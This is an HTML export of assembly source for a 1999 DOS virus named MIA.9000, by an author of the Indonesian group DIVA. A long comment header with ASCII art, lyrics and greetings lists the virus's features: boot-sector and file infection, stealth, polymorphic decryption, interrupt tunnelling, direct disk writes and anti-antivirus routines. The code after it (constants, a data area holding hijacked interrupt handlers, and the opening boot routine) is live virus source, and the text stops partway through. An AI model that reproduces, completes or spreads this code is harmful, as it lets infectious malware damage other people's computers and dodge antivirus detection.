<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc3 {
	color: #808080;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
.sc13 {
	color: #808080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">;Comment ˇ                                                        [DIVA] 1999</span><span class="sc0">
</span><span class="sc1">;                      * SOURCE FILE OF MIA.9000 VIRUS *</span><span class="sc0">
</span><span class="sc1">;   ‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹</span><span class="sc0">
</span><span class="sc1">;  ›€     WARNING: DISTRIBUTION OF THIS FILE IS (not) VERY ILLEGAL!!     €ﬁ</span><span class="sc0">
</span><span class="sc1">; ≥›€                                                    €ﬁ≥</span><span class="sc0">
</span><span class="sc1">; ≥›€                  ⁄ƒƒƒƒƒƒƒƒƒø⁄ƒø⁄ƒƒƒƒƒø                   €ﬁ≥</span><span class="sc0">
</span><span class="sc1">; ≥›€                  ≥€€€€€€€€€≥≥€≥≥€€€€€≥                   €ﬁ≥</span><span class="sc0">
</span><span class="sc1">; ≥›€                  ≥€⁄ƒø€⁄ƒø€≥≥€≥≥€⁄ƒø€≥                   €ﬁ≥</span><span class="sc0">
</span><span class="sc1">; ≥›€                  ≥€≥ ¿ƒŸ ≥€≥≥€≥≥€¿ƒŸ€≥                   €ﬁ≥</span><span class="sc0">
</span><span class="sc1">; ≥›€                  ≥€≥   ≥€≥≥€≥≥€€€€€≥                   €ﬁ≥</span><span class="sc0">
</span><span class="sc1">; ≥›€                  ≥€≥    ≥€≥≥€≥≥€⁄ƒø€≥                   €ﬁ≥</span><span class="sc0">
</span><span class="sc1">; ≥›€                  ≥€≥   ≥€≥≥€≥≥€≥ ≥€≥                   €ﬁ≥</span><span class="sc0">
</span><span class="sc1">; ≥›€                  ¿ƒŸ    ¿ƒŸ¿ƒŸ¿ƒŸ ¿ƒŸ                   €ﬁ≥</span><span class="sc0">
</span><span class="sc1">; ≥›€                                                     €ﬁ≥</span><span class="sc0">
</span><span class="sc1">;  ›€     (P) &amp; (C) 1999 Fulvian/DIVA, Fully registered to: Mia W.     €ﬁ</span><span class="sc0">
</span><span class="sc1">;   ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ</span><span class="sc0">
</span><span class="sc1">;                             D I S C L A I M E R:</span><span class="sc0">
</span><span class="sc1">;           FULVIAN IS FULLY RESPONSIBLE FOR ANY PROBLEM THAT OCCURS</span><span class="sc0">
</span><span class="sc1">;    WHICH IS DUE TO ASSEMBLING THIS FILE IN MIA'S PC, BUT NOT IN YOUR PCs! </span><span class="sc0">
</span><span class="sc1">;      PLEASE EXECUTE THE COMPILED VERSION IN CAREFULLY-CONTROLLED SYSTEM   </span><span class="sc0">
</span><span class="sc1">;                  AND ONLY IF YOU KNOW WHAT YOU ARE DOING!!!               </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;  IF YA FEEL YOU'RE ANTI-ASIAN, PLEASE STOP READING NOW AND DELETE THIS FILE!!</span><span class="sc0">
</span><span class="sc1">;    &lt; Digital Indonesian Vx Authors [DIVA], the city of Malang - Indonesia &gt;</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;                  *** The codes in this source are 16-bit! ***</span><span class="sc0">
</span><span class="sc1">;           if You think You can find 32-bit stuff here, You're wrong!</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;                              </span><span class="sc0">
</span><span class="sc1">;                             </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;      DIVA comes out crawling from the ruins of the past, believe it or not</span><span class="sc0">
</span><span class="sc1">;      It wears the same old face everyone thought was dead and gone forever</span><span class="sc0">
</span><span class="sc1">;                               buried by the time.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;      It comes up screaming from the ashes of the grave, to make this world</span><span class="sc0">
</span><span class="sc1">;                                 a battle field.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;      It's got a voice that steals the courage from the brave, and leaves a</span><span class="sc0">
</span><span class="sc1">;                              scar that won't heal.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;      Unholy alliance, unholy alliance, don't fight it, You just can't win!</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;  Virus name       : MIA.9000 (the best variant of IRMA.9000)</span><span class="sc0">
</span><span class="sc1">;  Aliases/a.k.a.   : DIE_HARD_3.B, FATAL_ILLUSION_2.B, MATRIX.9000.B</span><span class="sc0">
</span><span class="sc1">;  Version          : 1.30</span><span class="sc0">
</span><span class="sc1">;  Type             : Not dangerous, resident, multi-partite, and stealth </span><span class="sc0">
</span><span class="sc1">;  Environment      : DOS</span><span class="sc0">
</span><span class="sc1">;  Author           : Fulvian/DIVA</span><span class="sc0">
</span><span class="sc1">;  Origin           : Indonesia</span><span class="sc0">
</span><span class="sc1">;  Dedication       : Mia W.</span><span class="sc0">
</span><span class="sc1">;  Creation date    : ??-??-1999</span><span class="sc0">
</span><span class="sc1">;  Creation time    : ??:??:?? GMT</span><span class="sc0">
</span><span class="sc1">;  Creation place   : Da house of mine, home sweet home... 8-)</span><span class="sc0">
</span><span class="sc1">;  Compiler/linker  : Turbo Assembler v5.00/Turbo Link v7.1.30.1</span><span class="sc0">
</span><span class="sc1">;  Compiling command: TASM /m /zn MIA.ASM or TASM32 /m /zn MIA.ASM</span><span class="sc0">
</span><span class="sc1">;  Linking command  : TLINK /x /ye /yx MIA.OBJ</span><span class="sc0">
</span><span class="sc1">;  Objectives       : FD/HD BOOT, .ARJ, .BIN, .COM, .EXE, .LHA, .LZH, .PAK, .RAR</span><span class="sc0">
</span><span class="sc1">;  BRs infection    : Replacement (cleanable)</span><span class="sc0">
</span><span class="sc1">;  Files infection  ; Appending (cleanable)</span><span class="sc0">
</span><span class="sc1">;  Features         : + Memory-transient (under DOS)</span><span class="sc0">
</span><span class="sc1">;                     + Quick-polymorphic (and oligomorphic)</span><span class="sc0">
</span><span class="sc1">;                     + Fully stealthy (under DOS)</span><span class="sc0">
</span><span class="sc1">;                     + Direct IDE HD write capability</span><span class="sc0">
</span><span class="sc1">;                     + Indirect interrupts hook (tunneling tech also used)</span><span class="sc0">
</span><span class="sc1">;                     + Warm reboot survival (if HD present, and BIOS is Award?)</span><span class="sc0">
</span><span class="sc1">;                     + Some retros for TBAV utilities</span><span class="sc0">
</span><span class="sc1">;                     + Very contagious</span><span class="sc0">
</span><span class="sc1">;  Bugs/drawbacks   : - Works improperly under Microsoft Windows (tm) 8-(</span><span class="sc0">
</span><span class="sc1">;                     - Does not install internal stack</span><span class="sc0">
</span><span class="sc1">;                     - May have some problems with DESQview</span><span class="sc0">
</span><span class="sc1">;                     - Does not recognize LE/LX/NE/PE/W3 during .EXE infection</span><span class="sc0">
</span><span class="sc1">;                     - Infects .EXE files that have internal overlays anyhow</span><span class="sc0">
</span><span class="sc1">;                     - No FCB stealth routines (except for directory entry)</span><span class="sc0">
</span><span class="sc1">;                     - Droppers in archives have the same size</span><span class="sc0">
</span><span class="sc1">;                     - Sometimes causes crosslinks?</span><span class="sc0">
</span><span class="sc1">;                     - ... and many more... ;-( (mail to: fulvian@usa.net)</span><span class="sc0">
</span><span class="sc1">;  Greets/scorns    : + Mia W. (I love You, I mind You, I need You, I want You)</span><span class="sc0">
</span><span class="sc1">;                     + DIVA members (Viva forever! You're irksome lazybones!!)</span><span class="sc0">
</span><span class="sc1">;                     + Ralf Brown (Wow! excellent interrupt listing!)</span><span class="sc0">
</span><span class="sc1">;                     + 29A guys (I adore You, smart ones)</span><span class="sc0">
</span><span class="sc1">;                     + Lord Julus (I hate Your math lessons)</span><span class="sc0">
</span><span class="sc1">;                     + Int13h (How's Paraguay? Paraguayos Republicao Muerte...)</span><span class="sc0">
</span><span class="sc1">;                     + Assembler Head (Don't humble Your abilities)</span><span class="sc0">
</span><span class="sc1">;                     + Sepultura Aussie &amp; other IRs (April fool sucks!!)</span><span class="sc0">
</span><span class="sc1">;                     + AVM, KompuTEK, K-Elektronik, Hackerlink (Shut Your beaks!)</span><span class="sc0">
</span><span class="sc1">;                     + And all virus-related people in the world (Hello!!)</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; ˇ</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;         Title MIA is in the stardom, goin' worlwide, and indisputable!!</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc5">P286</span><span class="sc0">                           </span><span class="sc1">; Required processor: Intel 80286+</span><span class="sc0">


 </span><span class="sc9">.errndef</span><span class="sc0"> </span><span class="sc5">??version</span><span class="sc0"> </span><span class="sc3">"Borland Turbo Assembler is recommended!!"</span><span class="sc0">

</span><span class="sc9">If</span><span class="sc0"> </span><span class="sc5">??version</span><span class="sc0"> </span><span class="sc9">lt</span><span class="sc0"> </span><span class="sc2">0200h</span><span class="sc0">          </span><span class="sc1">; Check Turbo Assembler version, must be</span><span class="sc0">
 </span><span class="sc9">.err</span><span class="sc0">  </span><span class="sc3">"Need version 2.00+"</span><span class="sc0">    </span><span class="sc1">; version 2.00 or newer</span><span class="sc0">
</span><span class="sc9">Endif</span><span class="sc0">

</span><span class="sc9">If</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">VirLen</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">Mutant</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc9">gt</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">Loader</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">200h</span><span class="sc4">)</span><span class="sc0">
 </span><span class="sc9">.err</span><span class="sc0">  </span><span class="sc3">"Need one more sector!"</span><span class="sc0">
</span><span class="sc9">Endif</span><span class="sc0">

</span><span class="sc9">If</span><span class="sc0"> </span><span class="sc5">ParSiz</span><span class="sc0"> </span><span class="sc9">gt</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">Memory</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc4">)</span><span class="sc0">
 </span><span class="sc9">.err</span><span class="sc0">  </span><span class="sc3">"Lack of memory on booting!"</span><span class="sc0">
</span><span class="sc9">Endif</span><span class="sc0">

</span><span class="sc5">setalc</span><span class="sc0"> </span><span class="sc9">Macro</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">0D6h</span><span class="sc0">                   </span><span class="sc1">; Macro for (undocumented) SETALC opcode</span><span class="sc0">
</span><span class="sc9">EndM</span><span class="sc0">

</span><span class="sc5">Display</span><span class="sc0"> </span><span class="sc3">"Mia, why were You misunderstood? just try to conceive a like for Me!"</span><span class="sc0">

</span><span class="sc5">Baby</span><span class="sc0"> </span><span class="sc9">Segment</span><span class="sc0"> </span><span class="sc10">Para</span><span class="sc0"> </span><span class="sc10">Byte</span><span class="sc0"> </span><span class="sc12">'Fulvian'</span><span class="sc0"> </span><span class="sc9">Public</span><span class="sc0"> </span><span class="sc12">'DIVA'</span><span class="sc0"> </span><span class="sc9">Use16</span><span class="sc0">
     </span><span class="sc9">Assume</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">Baby</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:</span><span class="sc5">Baby</span><span class="sc0">
     </span><span class="sc9">Org</span><span class="sc0"> </span><span class="sc2">0000h</span><span class="sc0">                 

</span><span class="sc5">Mutant</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0">  </span><span class="sc2">019Ch</span><span class="sc0">             </span><span class="sc1">; Maximum size of file decryptor (412 bytes)</span><span class="sc0">
</span><span class="sc5">Loader</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0">    </span><span class="sc2">11h</span><span class="sc0">             </span><span class="sc1">; Virus length in sectors (17 sectors)</span><span class="sc0">
</span><span class="sc10">Memory</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0">  </span><span class="sc2">000Ah</span><span class="sc0">             </span><span class="sc1">; Memory page needed on booting (10 KB)</span><span class="sc0">
</span><span class="sc5">VirVxD</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0">  </span><span class="sc2">0028h</span><span class="sc0">             </span><span class="sc1">; Dropper's host size (40 bytes)</span><span class="sc0">
</span><span class="sc5">VirLen</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">VirEnd</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">VirBeg</span><span class="sc0">
</span><span class="sc5">VirZon</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Slack</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">VirBeg</span><span class="sc0">
</span><span class="sc5">VirPar</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0">  </span><span class="sc4">(((</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Slack</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">200h</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">VirBeg</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0Fh</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0"> 
</span><span class="sc5">ParSiz</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0">  </span><span class="sc5">VirPar</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc0">

</span><span class="sc5">VirBeg</span><span class="sc0">  </span><span class="sc9">label</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0">
                               </span><span class="sc1">; On booting, MIA receives control from</span><span class="sc0">
 </span><span class="sc6">cld</span><span class="sc0">                           </span><span class="sc1">; infected boot-record that reads the whole</span><span class="sc0">
 </span><span class="sc6">jmp</span><span class="sc0">    </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">BootStrap</span><span class="sc0">        </span><span class="sc1">; body and brings control to here</span><span class="sc0">

</span><span class="sc5">Buffy</span><span class="sc4">:</span><span class="sc0">
                 </span><span class="sc9">dw</span><span class="sc0">     </span><span class="sc2">0A6B3h</span><span class="sc0"> </span><span class="sc1">; Hmmm, this must be an .EXE signature, but...</span><span class="sc0">
                 </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0000h</span><span class="sc0"> </span><span class="sc1">; Remainder of 512 bytes page</span><span class="sc0">
                 </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">00F7h</span><span class="sc0"> </span><span class="sc1">; Number of 512 bytes pages to hold the file (include header)</span><span class="sc0">
                 </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0000h</span><span class="sc0"> </span><span class="sc1">; Number of relocation table entries (?)</span><span class="sc0">
                 </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">00FEh</span><span class="sc0"> </span><span class="sc1">; Header size in paragraph </span><span class="sc0">
                 </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0101h</span><span class="sc0"> </span><span class="sc1">; Minimum paragraphs of memory needed</span><span class="sc0">
                 </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0101h</span><span class="sc0"> </span><span class="sc1">; Maximum paragraphs of memory needed</span><span class="sc0">
                 </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0000h</span><span class="sc0"> </span><span class="sc1">; Segment displacement of stack module</span><span class="sc0">
                 </span><span class="sc9">dw</span><span class="sc0">     </span><span class="sc2">0D9F0h</span><span class="sc0"> </span><span class="sc1">; Initial Stack Pointer</span><span class="sc0">
                 </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0000h</span><span class="sc0"> </span><span class="sc1">; .EXE's negative checksum</span><span class="sc0">
                 </span><span class="sc9">dw</span><span class="sc0">     </span><span class="sc2">0D9F0h</span><span class="sc0"> </span><span class="sc1">; Initial Instruction Pointer</span><span class="sc0">
                 </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0000h</span><span class="sc0"> </span><span class="sc1">; Segment displacement of code module</span><span class="sc0">
</span><span class="sc5">F_Off</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">9D80233Ah</span><span class="sc0"> </span><span class="sc1">; Saved file's Segment:Offset</span><span class="sc0">
</span><span class="sc5">DOS_Disk</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">007003EEh</span><span class="sc0"> </span><span class="sc1">; Original DOS I/O handler</span><span class="sc0">
</span><span class="sc5">DOS_Floppy</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0F000EC59h</span><span class="sc0"> </span><span class="sc1">; Diskette I/O handler</span><span class="sc0">
</span><span class="sc5">Old_Tracer</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00700465h</span><span class="sc0"> </span><span class="sc1">; Single-step interrupt handler</span><span class="sc0">
</span><span class="sc5">Clock_Tick</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">0FDh</span><span class="sc0"> </span><span class="sc1">; Counter?</span><span class="sc0">
</span><span class="sc5">SFT_Off</span><span class="sc0">          </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0000h</span><span class="sc0"> </span><span class="sc1">; Current SFT offset</span><span class="sc0">
                 </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0000h</span><span class="sc0"> </span><span class="sc1">; Current SFT segment</span><span class="sc0">
</span><span class="sc5">LowPos</span><span class="sc0">           </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0000h</span><span class="sc0"> </span><span class="sc1">; (Relative)</span><span class="sc0">
</span><span class="sc5">HiPos</span><span class="sc0">            </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0000h</span><span class="sc0"> </span><span class="sc1">; (Relative)</span><span class="sc0">
</span><span class="sc5">LowSiz</span><span class="sc0">           </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0000h</span><span class="sc0"> </span><span class="sc1">; (Relative)</span><span class="sc0">
</span><span class="sc5">HiSiz</span><span class="sc0">            </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0000h</span><span class="sc0"> </span><span class="sc1">; (Relative)</span><span class="sc0">
</span><span class="sc5">ReadOff</span><span class="sc0">          </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0000h</span><span class="sc0"> </span><span class="sc1">; (Relative)</span><span class="sc0">
</span><span class="sc5">R_Bytes</span><span class="sc0">          </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0000h</span><span class="sc0"> </span><span class="sc1">; (Relative)</span><span class="sc0">
</span><span class="sc5">Pointer</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0">        </span><span class="sc2">00h</span><span class="sc0"> </span><span class="sc1">; Pointer to decryptor building</span><span class="sc0">
</span><span class="sc5">Resultant</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">        </span><span class="sc2">00h</span><span class="sc0"> </span><span class="sc1">; Register pointer used in decryptor (SI/DI)</span><span class="sc0">
</span><span class="sc5">Displacement</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">        </span><span class="sc2">00h</span><span class="sc0"> </span><span class="sc1">; Memory reference displacement for decryptor</span><span class="sc0">
</span><span class="sc5">Direction</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">        </span><span class="sc2">00h</span><span class="sc0"> </span><span class="sc1">; Direction of decryptor (i.e. forward/backward)</span><span class="sc0">
</span><span class="sc5">Overdrive</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">        </span><span class="sc2">00h</span><span class="sc0"> </span><span class="sc1">; Random byte indicates register for decryptor</span><span class="sc0">
</span><span class="sc5">Deathblow</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">        </span><span class="sc2">00h</span><span class="sc0"> </span><span class="sc1">; Maximum number of stack "crasher"</span><span class="sc0">
                 </span><span class="sc9">db</span><span class="sc0">        </span><span class="sc2">00h</span><span class="sc0"> </span><span class="sc1">; (Unused?)</span><span class="sc0">
</span><span class="sc5">Stuff_01</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0">        </span><span class="sc2">00h</span><span class="sc0"> </span><span class="sc1">; (Relative)</span><span class="sc0">
                 </span><span class="sc9">db</span><span class="sc0">        </span><span class="sc2">00h</span><span class="sc0"> </span><span class="sc1">; (Unused?)</span><span class="sc0">
</span><span class="sc5">Stuff_02</span><span class="sc0">         </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0000h</span><span class="sc0"> </span><span class="sc1">; (Relative)</span><span class="sc0">
</span><span class="sc5">Old_Time</span><span class="sc0">         </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0000h</span><span class="sc0"> </span><span class="sc1">; File's time stamp</span><span class="sc0">
</span><span class="sc5">Old_Date</span><span class="sc0">         </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0000h</span><span class="sc0"> </span><span class="sc1">; File's date stamp</span><span class="sc0">


</span><span class="sc5">BootStrap</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Buffy</span><span class="sc0">                  </span><span class="sc1">; Decrypting...</span><span class="sc0">

</span><span class="sc5">Start</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">ss</span><span class="sc0">
 </span><span class="sc6">test</span><span class="sc0">   </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">dl</span><span class="sc0">                  </span><span class="sc1">; Booting from FD or HD ?</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">                  </span><span class="sc1">; BX = SI = boot delta offset</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">Condition</span><span class="sc4">],</span><span class="sc2">0EBh</span><span class="sc0">
